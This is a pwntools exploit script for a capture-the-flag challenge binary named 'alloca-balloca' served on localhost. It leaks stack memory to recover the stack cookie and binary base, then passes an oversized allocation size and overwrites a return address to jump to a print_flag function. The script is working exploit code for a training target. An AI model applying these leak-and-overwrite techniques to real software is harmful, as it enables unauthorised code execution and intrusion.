#!/usr/bin/env python3

from pwn import *
import re

context(arch='amd64', os='linux')

HOST = 'localhost'
PORT = 31337

elf = ELF('./container/alloca-balloca')

def menu(r, choice):
    r.recvline_contains('5. exit')
    r.recvline_contains('>')
    r.sendline(str(choice))

#r = elf.process()
r = remote(HOST, PORT)

BUF_SIZE1 = 0x100
BUF_SIZE2 = 0xFFFFFFFFFFFFFFFF
LEAK_OFFSET = 0x12C9

# Allocate chunk 1
menu(r, 1)
r.recvline_contains('Index:')
r.sendline(str(0))
r.recvline_contains("Storlek:")
r.sendline(str(BUF_SIZE1))

# Leak data
menu(r, 2)
r.recvline_contains('Index:')
r.sendline(str(0))
leak = r.recv(BUF_SIZE1)
log.info('Leaked data:')
log.hexdump(leak)

leak_binary_addr = u64(leak[-8:])
stack_cookie = u64(leak[7*8:8*8])
log.info('Stack cookie: %#18x', stack_cookie)
log.info('Leaked address: %#10x', leak_binary_addr)
elf.address = leak_binary_addr - LEAK_OFFSET
log.info('Binary base: %#10x', elf.address)
addr_print_flag = elf.symbols['print_flag']
log.info('Print flag address: %#10x', addr_print_flag)

# Allocate chunk 2
menu(r, 1)
r.recvline_contains('Index:')
r.sendline(str(0))
r.recvline_contains("Storlek:")
r.sendline(str(BUF_SIZE2))

"""
pie break *0x0000000000001646
x/4gx 0x000055be3c2c5000 + 0x4040
"""
# Write to chunk 2
menu(r, 3)
r.recvline_contains('Index:')
pause()
r.sendline(str(0))
payload = b''
payload += b'A'*(7+2*8)
payload += p64(addr_print_flag)
r.sendline(payload)
response = r.recv(0x1000)
flag = re.match(rb'SSM{.*}', response).group(0).decode('ascii')
log.info('Flag: %s', flag)
